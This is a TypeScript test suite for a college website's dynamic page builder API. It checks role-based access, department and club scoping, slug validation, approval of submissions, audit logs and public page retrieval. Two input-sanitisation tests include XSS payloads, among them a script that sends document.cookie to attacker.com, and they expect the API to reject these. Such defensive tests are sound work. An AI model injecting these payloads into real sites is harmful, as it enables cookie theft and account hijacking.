/**
 * dynamic-page.test.ts — Unit & Integration Tests for Sub-Phase 4B-1: Dynamic Page Builder
 *
 * Test Coverage:
 *  1. Admin Dynamic Page Listing:
 *     - Authentication requirement (401 on unauthenticated).
 *     - Authorization requirement (403 on staff without pages:read).
 *     - Master Admin unfiltered access.
 *     - HOD department scoping enforcement (auto-filter + 403 on cross-department query).
 *     - Club Head club scoping enforcement (auto-filter + 403 on cross-club query).
 *  2. Admin Dynamic Page Retrieval:
 *     - 404 on non-existent page identifier.
 *     - 403 when HOD accesses another department's page.
 *     - 403 when Club Head accesses another club's page.
 *     - 200 when authorized.
 *  3. Dynamic Page Creation:
 *     - Validation of required fields (title, slug).
 *     - Validation of URL-safe slugs (rejection of uppercase, special chars).
 *     - XSS & Dangerous URI scheme rejection (disallowed <script> tags, javascript: URLs).
 *     - Slug uniqueness check (409 Conflict).
 *     - Scope enforcement for HOD and Club Head.
 *     - Direct publication gating: master_admin publishes directly (status: published).
 *     - Non-publisher publication gating: auto-downgraded to status: submitted + approval record.
 *     - Audit log emission for CREATE action.
 *  4. Dynamic Page Updates:
 *     - 404 on non-existent page.
 *     - Slug conflict detection (409 Conflict).
 *     - Scope enforcement for HOD and Club Head on update.
 *     - Version increment and audit log emission.
 *  5. Dynamic Page Deletion & Archival:
 *     - Soft archival (?archive=true).
 *     - Permanent deletion and audit log emission.
 *     - Scope enforcement on deletion.
 *  6. Public Read-Only Endpoint (/api/pages/:slug & /api/v1/pages/:slug):
 *     - 200 OK for published pages.
 *     - 404 Not Found for draft, submitted, pending, or archived pages.
 *     - Filtering out invisible blocks.
 */
import request from 'supertest';
import jwt from 'jsonwebtoken';
import { createApp } from '../app';
import { User, DynamicPage, AuditLog, Approval } from '../models';

const app = createApp({
  corsOrigins: ['http://localhost:3000'],
  trustProxy: false,
});

const JWT_SECRET = 'test_jwt_secret_with_more_than_32_characters_for_unit_tests';

function createAuthHeader(userProps: {
  id?: string;
  name?: string;
  email?: string;
  role: string;
  departmentId?: string;
  clubId?: string;
  permissions?: string[];
  status?: string;
  tokenVersion?: number;
}) {
  const userId = userProps.id || '507f1f77bcf86cd799439011';
  const payload = {
    sub: userId,
    email: userProps.email || `${userProps.role}@bac.edu.in`,
    role: userProps.role,
    tokenVersion: userProps.tokenVersion ?? 1,
  };
  const token = jwt.sign(payload, JWT_SECRET, { expiresIn: '1h' });

  return {
    header: `Bearer ${token}`,
    userDoc: {
      _id: userId,
      id: userId,
      name: userProps.name || `Test ${userProps.role}`,
      email: payload.email,
      role: userProps.role,
      departmentId: userProps.departmentId,
      clubId: userProps.clubId,
      permissions: userProps.permissions || [],
      status: userProps.status || 'active',
      tokenVersion: payload.tokenVersion,
      toObject() {
        return { ...this };
      },
    },
  };
}

describe('Sub-Phase 4B-1: Dynamic Page Builder', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  // ════════════════════════════════════════════════════════════════════════════
  // 1. ADMIN LISTING & RETRIEVAL (GET /api/admin/pages & /api/pages)
  // ════════════════════════════════════════════════════════════════════════════
  describe('1. Dynamic Page Listing & Retrieval API', () => {
    it('1.1: GET /api/admin/pages rejects unauthenticated requests with 401', async () => {
      const res = await request(app).get('/api/admin/pages');
      expect(res.status).toBe(401);
      expect(res.body.success).toBe(false);
    });

    it('1.2: GET /api/admin/pages rejects unauthorized roles (staff without permission) with 403', async () => {
      const auth = createAuthHeader({ role: 'staff', permissions: ['unrelated:perm'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      const res = await request(app).get('/api/admin/pages').set('Authorization', auth.header);
      expect(res.status).toBe(403);
      expect(res.body.code).toBe('FORBIDDEN_PERMISSION');
    });

    it('1.3: GET /api/admin/pages allows master_admin to query all pages', async () => {
      const auth = createAuthHeader({ role: 'master_admin', permissions: ['*'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      const mockPages = [
        {
          _id: '507f1f77bcf86cd799439001',
          title: 'Campus Life',
          slug: 'campus-life',
          pageType: 'standard',
          status: 'published',
          blocks: [],
          seo: {},
          version: 1,
          createdAt: new Date(),
          updatedAt: new Date(),
        },
      ];

      jest.spyOn(DynamicPage, 'find').mockReturnValue({
        sort: jest.fn().mockReturnValue({
          skip: jest.fn().mockReturnValue({
            limit: jest.fn().mockReturnValue({
              lean: jest.fn().mockResolvedValue(mockPages),
            }),
          }),
        }),
      } as any);
      jest.spyOn(DynamicPage, 'countDocuments').mockResolvedValue(1 as any);

      const res = await request(app).get('/api/admin/pages').set('Authorization', auth.header);
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.count).toBe(1);
      expect(res.body.data[0].slug).toBe('campus-life');
    });

    it('1.4: GET /api/admin/pages enforces HOD scope boundary (rejects mismatched department query)', async () => {
      const auth = createAuthHeader({ role: 'hod', departmentId: 'computer-science', permissions: ['pages:read'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      const res = await request(app)
        .get('/api/admin/pages?departmentId=commerce')
        .set('Authorization', auth.header);

      expect(res.status).toBe(403);
      expect(res.body.code).toBe('FORBIDDEN_DEPARTMENT_SCOPE');
    });

    it('1.5: GET /api/admin/pages enforces Club Head scope boundary (rejects mismatched club query)', async () => {
      const auth = createAuthHeader({ role: 'club_head', clubId: 'rotaract-club', permissions: ['pages:read'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      const res = await request(app)
        .get('/api/admin/pages?clubId=sports-club')
        .set('Authorization', auth.header);

      expect(res.status).toBe(403);
      expect(res.body.code).toBe('FORBIDDEN_CLUB_SCOPE');
    });

    it('1.6: GET /api/admin/pages/:id returns 404 for non-existent page', async () => {
      const auth = createAuthHeader({ role: 'master_admin', permissions: ['pages:read'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      jest.spyOn(DynamicPage, 'findOne').mockReturnValue({
        lean: jest.fn().mockResolvedValue(null),
      } as any);

      const res = await request(app)
        .get('/api/admin/pages/unknown-page-slug')
        .set('Authorization', auth.header);

      expect(res.status).toBe(404);
      expect(res.body.code).toBe('PAGE_NOT_FOUND');
    });

    it('1.7: GET /api/admin/pages/:id blocks HOD from viewing a different department draft page', async () => {
      const auth = createAuthHeader({ role: 'hod', departmentId: 'computer-science', permissions: ['pages:read'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      const mockForeignPage = {
        _id: '507f1f77bcf86cd799439002',
        title: 'Commerce Lab Manual',
        slug: 'commerce-lab-manual',
        departmentId: 'commerce',
        status: 'draft',
      };

      jest.spyOn(DynamicPage, 'findOne').mockReturnValue({
        lean: jest.fn().mockResolvedValue(mockForeignPage),
      } as any);

      const res = await request(app)
        .get('/api/admin/pages/507f1f77bcf86cd799439002')
        .set('Authorization', auth.header);

      expect(res.status).toBe(403);
      expect(res.body.code).toBe('FORBIDDEN_DEPARTMENT_SCOPE');
    });
  });

  // ════════════════════════════════════════════════════════════════════════════
  // 2. DYNAMIC PAGE CREATION & INPUT SANITIZATION
  // ════════════════════════════════════════════════════════════════════════════
  describe('2. Dynamic Page Creation (POST /api/admin/pages)', () => {
    it('2.1: Rejects payload with missing title or slug with 400', async () => {
      const auth = createAuthHeader({ role: 'master_admin', permissions: ['pages:create'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      const res = await request(app)
        .post('/api/admin/pages')
        .set('Authorization', auth.header)
        .send({
          title: '',
          slug: '',
        });

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
    });

    it('2.2: Rejects invalid slug with spaces or uppercase characters with 400', async () => {
      const auth = createAuthHeader({ role: 'master_admin', permissions: ['pages:create'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      const res = await request(app)
        .post('/api/admin/pages')
        .set('Authorization', auth.header)
        .send({
          title: 'Invalid Page Slug',
          slug: 'Invalid Slug With Spaces!',
        });

      expect(res.status).toBe(400);
      expect(res.body.error).toMatch(/Slug must be URL-safe/i);
    });

    it('2.3: Rejects XSS attempt with javascript: URI in bannerImage or block content with 400', async () => {
      const auth = createAuthHeader({ role: 'master_admin', permissions: ['pages:create'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      const res = await request(app)
        .post('/api/admin/pages')
        .set('Authorization', auth.header)
        .send({
          title: 'Malicious Page',
          slug: 'malicious-page',
          bannerImage: 'javascript:alert(document.cookie)',
        });

      expect(res.status).toBe(400);
      expect(res.body.error).toMatch(/dangerous schemes/i);
    });

    it('2.4: Rejects XSS attempt with <script> tag in block content with 400', async () => {
      const auth = createAuthHeader({ role: 'master_admin', permissions: ['pages:create'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      const res = await request(app)
        .post('/api/admin/pages')
        .set('Authorization', auth.header)
        .send({
          title: 'Page with Script Block',
          slug: 'page-with-script',
          blocks: [
            {
              id: 'b-1',
              type: 'text',
              content: { text: '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>' },
              order: 1,
              visible: true,
            },
          ],
        });

      expect(res.status).toBe(400);
      expect(res.body.error).toMatch(/dangerous scripts/i);
    });

    it('2.5: Rejects duplicate slug collision with 409 Conflict', async () => {
      const auth = createAuthHeader({ role: 'master_admin', permissions: ['pages:create'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      jest.spyOn(DynamicPage, 'findOne').mockReturnValue({
        lean: jest.fn().mockResolvedValue({ _id: 'existing-id', slug: 'existing-slug' }),
      } as any);

      const res = await request(app)
        .post('/api/admin/pages')
        .set('Authorization', auth.header)
        .send({
          title: 'Existing Page',
          slug: 'existing-slug',
        });

      expect(res.status).toBe(409);
      expect(res.body.code).toBe('CONFLICT');
      expect(res.body.error).toMatch(/already exists/i);
    });

    it('2.6: Prevents HOD from creating page for another department with 403', async () => {
      const auth = createAuthHeader({ role: 'hod', departmentId: 'computer-science', permissions: ['pages:create'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      jest.spyOn(DynamicPage, 'findOne').mockReturnValue({
        lean: jest.fn().mockResolvedValue(null),
      } as any);

      const res = await request(app)
        .post('/api/admin/pages')
        .set('Authorization', auth.header)
        .send({
          title: 'Commerce Department Page',
          slug: 'commerce-page',
          departmentId: 'commerce',
        });

      expect(res.status).toBe(403);
      expect(res.body.code).toBe('FORBIDDEN_DEPARTMENT_SCOPE');
    });

    it('2.7: Allows master_admin to create page directly with status: published and emits audit log', async () => {
      const auth = createAuthHeader({ role: 'master_admin', permissions: ['*'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      jest.spyOn(DynamicPage, 'findOne').mockReturnValue({
        lean: jest.fn().mockResolvedValue(null),
      } as any);

      const createdPageDoc = {
        _id: '507f1f77bcf86cd799439003',
        title: 'New Student Orientation',
        slug: 'new-student-orientation',
        pageType: 'standard',
        description: 'Comprehensive orientation guide for incoming freshmen.',
        bannerImage: 'https://bac.edu.in/images/orientation.jpg',
        blocks: [
          { id: 'b-1', type: 'heading', content: { title: 'Welcome', subtitle: 'BAC Orientation' }, order: 1, visible: true },
          { id: 'b-2', type: 'text', content: { text: 'Information text' }, order: 2, visible: true },
        ],
        seo: { metaTitle: 'BAC Orientation 2026', metaDescription: 'Orientation details' },
        status: 'published',
        authorId: auth.userDoc._id,
        authorName: auth.userDoc.name,
        version: 1,
      };

      jest.spyOn(DynamicPage, 'create').mockResolvedValue(createdPageDoc as any);
      const auditSpy = jest.spyOn(AuditLog, 'create').mockResolvedValue({} as any);

      const res = await request(app)
        .post('/api/admin/pages')
        .set('Authorization', auth.header)
        .send({
          title: 'New Student Orientation',
          slug: 'new-student-orientation',
          description: 'Comprehensive orientation guide for incoming freshmen.',
          bannerImage: 'https://bac.edu.in/images/orientation.jpg',
          blocks: [
            { id: 'b-1', type: 'heading', content: { title: 'Welcome', subtitle: 'BAC Orientation' }, order: 1, visible: true },
            { id: 'b-2', type: 'text', content: { text: 'Information text' }, order: 2, visible: true },
          ],
          seo: { metaTitle: 'BAC Orientation 2026', metaDescription: 'Orientation details' },
          status: 'published',
        });

      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);
      expect(res.body.data.status).toBe('published');
      expect(auditSpy).toHaveBeenCalled();
    });

    it('2.8: Downgrades status to submitted and creates Approval item when user lacks pages:publish', async () => {
      const auth = createAuthHeader({
        role: 'content_editor',
        permissions: ['pages:create'], // lacks pages:publish
      });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      jest.spyOn(DynamicPage, 'findOne').mockReturnValue({
        lean: jest.fn().mockResolvedValue(null),
      } as any);

      const createdPageDoc = {
        _id: '507f1f77bcf86cd799439004',
        title: 'Draft Campus Tour',
        slug: 'campus-tour',
        status: 'submitted',
        version: 1,
      };

      jest.spyOn(DynamicPage, 'create').mockResolvedValue(createdPageDoc as any);
      const approvalSpy = jest.spyOn(Approval, 'create').mockResolvedValue({} as any);
      jest.spyOn(AuditLog, 'create').mockResolvedValue({} as any);

      const res = await request(app)
        .post('/api/admin/pages')
        .set('Authorization', auth.header)
        .send({
          title: 'Draft Campus Tour',
          slug: 'campus-tour',
          status: 'published', // User tries to publish directly
        });

      expect(res.status).toBe(201);
      expect(res.body.data.status).toBe('submitted');
      expect(approvalSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          entityType: 'page',
          title: 'Draft Campus Tour',
          status: 'pending',
        })
      );
    });
  });

  // ════════════════════════════════════════════════════════════════════════════
  // 3. DYNAMIC PAGE UPDATES & SLUG CONFLICT CHECKS
  // ════════════════════════════════════════════════════════════════════════════
  describe('3. Dynamic Page Updates (PUT /api/admin/pages/:id)', () => {
    it('3.1: Returns 404 when updating non-existent page', async () => {
      const auth = createAuthHeader({ role: 'master_admin', permissions: ['pages:update'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      jest.spyOn(DynamicPage, 'findOne').mockResolvedValue(null);

      const res = await request(app)
        .put('/api/admin/pages/unknown-id')
        .set('Authorization', auth.header)
        .send({ title: 'Updated Title' });

      expect(res.status).toBe(404);
      expect(res.body.code).toBe('PAGE_NOT_FOUND');
    });

    it('3.2: Rejects slug update if it conflicts with another existing page with 409', async () => {
      const auth = createAuthHeader({ role: 'master_admin', permissions: ['pages:update'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      const mockExistingPage = {
        _id: '507f1f77bcf86cd799439005',
        slug: 'page-alpha',
        title: 'Page Alpha',
        version: 1,
        save: jest.fn(),
      };

      jest.spyOn(DynamicPage, 'findOne').mockImplementation((query: any) => {
        if (query.slug === 'page-beta') {
          return {
            lean: jest.fn().mockResolvedValue({ _id: '507f1f77bcf86cd799439006', slug: 'page-beta' }),
          } as any;
        }
        return mockExistingPage as any;
      });

      const res = await request(app)
        .put('/api/admin/pages/507f1f77bcf86cd799439005')
        .set('Authorization', auth.header)
        .send({ slug: 'page-beta' });

      expect(res.status).toBe(409);
      expect(res.body.code).toBe('CONFLICT');
      expect(res.body.error).toMatch(/already exists/i);
    });

    it('3.3: Successfully updates page, increments version, and emits audit log', async () => {
      const auth = createAuthHeader({ role: 'master_admin', permissions: ['pages:update'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      const mockPage = {
        _id: '507f1f77bcf86cd799439007',
        title: 'Original Title',
        slug: 'original-slug',
        version: 1,
        status: 'published',
        save: jest.fn().mockResolvedValue(true),
      };

      jest.spyOn(DynamicPage, 'findOne').mockResolvedValue(mockPage as any);
      const auditSpy = jest.spyOn(AuditLog, 'create').mockResolvedValue({} as any);

      const res = await request(app)
        .put('/api/admin/pages/507f1f77bcf86cd799439007')
        .set('Authorization', auth.header)
        .send({ title: 'Updated Title' });

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(mockPage.title).toBe('Updated Title');
      expect(mockPage.version).toBe(2);
      expect(mockPage.save).toHaveBeenCalled();
      expect(auditSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          action: 'UPDATE',
          module: 'Page Builder',
        })
      );
    });
  });

  // ════════════════════════════════════════════════════════════════════════════
  // 4. DYNAMIC PAGE DELETION & ARCHIVAL
  // ════════════════════════════════════════════════════════════════════════════
  describe('4. Dynamic Page Deletion (DELETE /api/admin/pages/:id)', () => {
    it('4.1: Soft-archives page when ?archive=true query param is present', async () => {
      const auth = createAuthHeader({ role: 'master_admin', permissions: ['pages:delete'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      const mockPage = {
        _id: '507f1f77bcf86cd799439008',
        title: 'Archivable Page',
        slug: 'archivable-page',
        status: 'published',
        save: jest.fn().mockResolvedValue(true),
      };

      jest.spyOn(DynamicPage, 'findOne').mockResolvedValue(mockPage as any);
      const deleteSpy = jest.spyOn(DynamicPage, 'findByIdAndDelete');

      const res = await request(app)
        .delete('/api/admin/pages/507f1f77bcf86cd799439008?archive=true')
        .set('Authorization', auth.header);

      expect(res.status).toBe(200);
      expect(mockPage.status).toBe('archived');
      expect(mockPage.save).toHaveBeenCalled();
      expect(deleteSpy).not.toHaveBeenCalled();
    });

    it('4.2: Permanently deletes page and emits DELETE audit log when archive query is omitted', async () => {
      const auth = createAuthHeader({ role: 'master_admin', permissions: ['pages:delete'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      const mockPage = {
        _id: '507f1f77bcf86cd799439009',
        title: 'Page to Delete',
        slug: 'page-to-delete',
      };

      jest.spyOn(DynamicPage, 'findOne').mockResolvedValue(mockPage as any);
      const deleteSpy = jest.spyOn(DynamicPage, 'findByIdAndDelete').mockResolvedValue(mockPage as any);
      const auditSpy = jest.spyOn(AuditLog, 'create').mockResolvedValue({} as any);

      const res = await request(app)
        .delete('/api/admin/pages/507f1f77bcf86cd799439009')
        .set('Authorization', auth.header);

      expect(res.status).toBe(200);
      expect(deleteSpy).toHaveBeenCalledWith('507f1f77bcf86cd799439009');
      expect(auditSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          action: 'DELETE',
          module: 'Page Builder',
        })
      );
    });
  });

  // ════════════════════════════════════════════════════════════════════════════
  // 5. PUBLIC READ-ONLY ENDPOINT (/api/pages/:slug & /api/v1/pages/:slug)
  // ════════════════════════════════════════════════════════════════════════════
  describe('5. Public Dynamic Page Endpoint (GET /api/pages/:slug)', () => {
    it('5.1: Returns 200 and filtered visible blocks for a published page', async () => {
      const mockPublishedPage = {
        _id: '507f1f77bcf86cd799439010',
        title: 'Academic Calendar',
        slug: 'academic-calendar',
        pageType: 'standard',
        description: 'Calendar for 2026',
        bannerImage: 'https://bac.edu.in/banner.jpg',
        blocks: [
          { id: 'b-1', type: 'heading', content: { title: 'Terms' }, order: 1, visible: true },
          { id: 'b-2', type: 'text', content: { text: 'Hidden draft block' }, order: 2, visible: false },
        ],
        seo: { metaTitle: 'Academic Calendar' },
        status: 'published',
        createdAt: new Date(),
        updatedAt: new Date(),
      };

      jest.spyOn(DynamicPage, 'findOne').mockReturnValue({
        lean: jest.fn().mockResolvedValue(mockPublishedPage),
      } as any);

      const res = await request(app).get('/api/pages/academic-calendar');

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.slug).toBe('academic-calendar');
      expect(res.body.data.blocks.length).toBe(1); // Hidden block omitted
      expect(res.body.data.blocks[0].id).toBe('b-1');
    });

    it('5.2: Returns 404 for draft, submitted, pending, or archived pages', async () => {
      jest.spyOn(DynamicPage, 'findOne').mockReturnValue({
        lean: jest.fn().mockResolvedValue(null), // Filtered out because status !== 'published'
      } as any);

      const res = await request(app).get('/api/pages/internal-draft');

      expect(res.status).toBe(404);
      expect(res.body.success).toBe(false);
      expect(res.body.code).toBe('PAGE_NOT_FOUND');
    });
  });

  // ════════════════════════════════════════════════════════════════════════════
  // 6. VERIFICATION & HARDENING SUITE (RBAC ROLES & INTEGRATION)
  // ════════════════════════════════════════════════════════════════════════════
  describe('6. Dynamic Page Verification & Hardening Suite (RBAC, Scoping & Public Parity)', () => {
    it('6.1: sub_admin is authorized to directly publish dynamic pages', async () => {
      const auth = createAuthHeader({ role: 'sub_admin', permissions: ['pages:manage'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      jest.spyOn(DynamicPage, 'findOne').mockReturnValue({
        lean: jest.fn().mockResolvedValue(null),
      } as any);
      const createSpy = jest.spyOn(DynamicPage, 'create').mockResolvedValue({
        _id: 'subadmin-page-1',
        title: 'SubAdmin Page',
        slug: 'subadmin-page',
        status: 'published',
      } as any);
      jest.spyOn(AuditLog, 'create').mockResolvedValue({} as any);

      const res = await request(app)
        .post('/api/admin/pages')
        .set('Authorization', auth.header)
        .send({
          title: 'SubAdmin Page',
          slug: 'subadmin-page',
          status: 'published',
        });

      expect(res.status).toBe(201);
      expect(createSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          status: 'published',
        })
      );
    });

    it('6.2: content_editor without pages:publish is downgraded to submitted with approval creation', async () => {
      const auth = createAuthHeader({ role: 'content_editor', permissions: ['pages:create'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      jest.spyOn(DynamicPage, 'findOne').mockReturnValue({
        lean: jest.fn().mockResolvedValue(null),
      } as any);
      const createSpy = jest.spyOn(DynamicPage, 'create').mockResolvedValue({
        _id: 'editor-page-1',
        title: 'Editor Draft Page',
        slug: 'editor-draft-page',
        status: 'submitted',
      } as any);
      const approvalSpy = jest.spyOn(Approval, 'create').mockResolvedValue({} as any);
      jest.spyOn(AuditLog, 'create').mockResolvedValue({} as any);

      const res = await request(app)
        .post('/api/admin/pages')
        .set('Authorization', auth.header)
        .send({
          title: 'Editor Draft Page',
          slug: 'editor-draft-page',
          status: 'published', // Requests direct publish
        });

      expect(res.status).toBe(201);
      // Downgraded to 'submitted'
      expect(createSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          status: 'submitted',
        })
      );
      // Approval entry triggered
      expect(approvalSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          entityType: 'page',
          status: 'pending',
        })
      );
    });

    it('6.3: club_head is restricted to assigned club and blocked with 403 for other clubs', async () => {
      const auth = createAuthHeader({ role: 'club_head', clubId: 'rotaract-club', permissions: ['pages:create'] });
      jest.spyOn(User, 'findById').mockReturnValue({
        select: jest.fn().mockReturnValue({
          lean: jest.fn().mockResolvedValue(auth.userDoc),
        }),
      } as any);

      jest.spyOn(DynamicPage, 'findOne').mockReturnValue({
        lean: jest.fn().mockResolvedValue(null),
      } as any);

      const res = await request(app)
        .post('/api/admin/pages')
        .set('Authorization', auth.header)
        .send({
          title: 'Unauthorized Club Page',
          slug: 'unauthorized-club-page',
          clubId: 'nature-club', // Different club
        });

      expect(res.status).toBe(403);
      expect(res.body.code).toBe('FORBIDDEN_CLUB_SCOPE');
    });

    it('6.4: Versioned /api/v1/pages/:slug and legacy /api/pages/:slug return identical sanitized data', async () => {
      const mockPublishedPage = {
        _id: '507f1f77bcf86cd799439099',
        title: 'Student Charter',
        slug: 'student-charter',
        pageType: 'standard',
        description: 'Rights and responsibilities',
        blocks: [],
        status: 'published',
        createdAt: new Date(),
        updatedAt: new Date(),
      };

      jest.spyOn(DynamicPage, 'findOne').mockReturnValue({
        lean: jest.fn().mockResolvedValue(mockPublishedPage),
      } as any);

      const resLegacy = await request(app).get('/api/pages/student-charter');
      const resV1 = await request(app).get('/api/v1/pages/student-charter');

      expect(resLegacy.status).toBe(200);
      expect(resV1.status).toBe(200);
      expect(resLegacy.body).toEqual(resV1.body);
    });
  });
});
